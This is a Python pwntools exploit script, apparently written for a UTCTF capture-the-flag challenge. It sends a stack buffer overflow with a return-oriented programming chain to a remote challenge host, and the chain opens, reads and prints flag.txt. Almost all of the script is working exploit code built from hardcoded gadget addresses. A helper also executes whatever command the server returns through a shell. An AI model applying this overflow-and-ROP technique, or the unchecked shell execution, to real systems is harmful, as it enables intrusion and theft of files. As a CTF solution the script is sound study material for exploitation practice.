from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def remote_pow(txt):
    t.recvuntil(txt)
    cmd = t.recvline()
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE).stdout
    t.sendline(res)


def check_addr_lsb(library, addr_str):
    with open(f"/proc/{t.pid}/maps", "r") as f:
        for l in f.readlines():
            if not library in l:
                continue
            assert l[12 - len(addr_str) :].startswith(addr_str)


def create_io() -> tubes.tube.tube:
    if local:
        if debug:
            if radare:
                io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
                util.proc.wait_for_debugger(util.proc.pidof(io)[0])
                return io
            return gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
        return process([elf_name], env={"LD_PRELOAD": libc_name})
    return remote(remote_addr, int(remote_port))


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    pop_rax = 0x47A3FB
    pop_rdi = 0x40204F
    pop_rsi = 0x4125B6
    pop_rdx_rbx = 0x48630B
    pop_rax_rdx_rbx = 0x490A4F
    mov_rdi_rsi = 0x47796A
    read = 0x44F8E0
    open = 0x44F7B0
    write = 0x44F980
    syscall = 0x44EF59
    tmp = 0x4C8F00
    payload = (
        b"A" * 0x80
        + p64(0xDEAD)
        + p64(pop_rdi)
        + p64(0)
        + p64(pop_rdx_rbx)
        + p64(12)
        + p64(0)
        + p64(read)
        + p64(mov_rdi_rsi)
        + p64(pop_rsi)
        + p64(0)
        + p64(pop_rax)
        + p64(2)
        + p64(pop_rdx_rbx)
        + p64(0)
        + p64(0)
        + p64(syscall)
        + p64(pop_rdx_rbx)
        + p64(0x3)
        + p64(0)
        + p64(pop_rdi)
        + p64(3)
        + p64(pop_rsi)
        + p64(tmp)
        + p64(read)
        + p64(pop_rdi)
        + p64(1)
        + p64(write),
    )

    sla(
        b">",
        # p64(mov_rdi_rsi)
        b"A" * 0x88
        + p64(pop_rdi)
        + p64(0)
        + p64(pop_rdx_rbx)
        + p64(12)
        + p64(0)
        + p64(read)
        + p64(mov_rdi_rsi)
        + p64(pop_rsi)
        + p64(0)
        + p64(pop_rax)
        + p64(2)
        + p64(pop_rdx_rbx)
        + p64(0)
        + p64(0)
        + p64(syscall)
        + p64(pop_rdx_rbx)
        + p64(0x100)
        + p64(0)
        + p64(pop_rdi)
        + p64(5)
        + p64(pop_rsi)
        + p64(tmp)
        + p64(read)
        + p64(pop_rdi)
        + p64(1)
        + p64(pop_rdx_rbx)
        + p64(0x100)
        + p64(0)
        + p64(write),
    )

    sla(b"Flag:", b"./flag.txt\0")

    t.interactive()


local = 0
debug = 1
radare = 0

elf_name = "./chal"
libc_name = ""
addr = "challenge.utctf.live 5141"
if addr.count(" ") == 1:
    remote_addr, remote_port = addr.split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
b *main+145
c
"""
for _ in range(1):
    try:
        t = create_io()
        solve()
    except KeyboardInterrupt:
        break
    except AssertionError as e:
        continue
    except Exception as e:
        print(e)
    finally:
        t.close()
